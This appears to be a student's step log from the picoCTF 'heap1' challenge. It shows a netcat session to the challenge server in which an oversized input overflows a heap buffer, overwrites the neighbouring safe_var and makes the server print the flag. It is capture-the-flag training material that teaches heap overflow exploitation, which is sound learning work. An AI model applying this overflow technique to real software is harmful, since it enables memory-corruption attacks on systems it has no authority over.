@@ -1,0 +1,136 @@
+s109056003@s109056003-VirtualBox:~/PicoGym/heap1$ ls -l
+total 36
+-rw-rw-r-- 1 s109056003 s109056003 20664  七  26 20:23 chall
+-rw-rw-r-- 1 s109056003 s109056003  3063  七  26 20:23 chall.c
+-rw-rw-r-- 1 s109056003 s109056003  4261  八   1 19:35 step.txt
+
+s109056003@s109056003-VirtualBox:~/PicoGym/heap1$ chmod +x chall
+s109056003@s109056003-VirtualBox:~/PicoGym/heap1$ ./chall
+./chall: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./chall)
+s109056003@s109056003-VirtualBox:~/PicoGym/heap1$ file chall
+chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e191661a34476dabf75adb49242d4b71521a6295, for GNU/Linux 3.2.0, with debug_info, not stripped
+
+
+$ nc tethys.picoctf.net 51624
+
+Welcome to heap1!
+I put my data on the heap so it should be safe from any tampering.
+Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.
+
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x5ea95328f2b0  ->   pico
++-------------+----------------+
+[*]   0x5ea95328f2d0  ->   bico
++-------------+----------------+
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+
+Enter your choice: 1
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x5ea95328f2b0  ->   pico
++-------------+----------------+
+[*]   0x5ea95328f2d0  ->   bico
++-------------+----------------+
+
+Enter your choice: 3
+
+
+Take a look at my variable: safe_var = bico
+
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+
+Enter your choice: 4
+Looks like everything is still secure!
+
+No flage for you :(
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 2
+Data for buffer: picopico
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 1
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x5ea95328f2b0  ->   picopico
++-------------+----------------+
+[*]   0x5ea95328f2d0  ->   bico
++-------------+----------------+
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x60794cd022b0  ->   pico
++-------------+----------------+
+[*]   0x60794cd022d0  ->   bico
++-------------+----------------+
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 2
+Data for buffer: picopicopicopicopicopicopicopicopico
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 1
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x60794cd022b0  ->   picopicopicopicopicopicopicopicopico
++-------------+----------------+
+[*]   0x60794cd022d0  ->   pico
++-------------+----------------+
+
+1. Print Heap:		(print the current state of the heap)
+2. Write to buffer:	(write to your own personal block of data on the heap)
+3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:		(Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 4
+
+YOU WIN
+picoCTF{starting_to_get_the_hang_79ee3270}
+
+
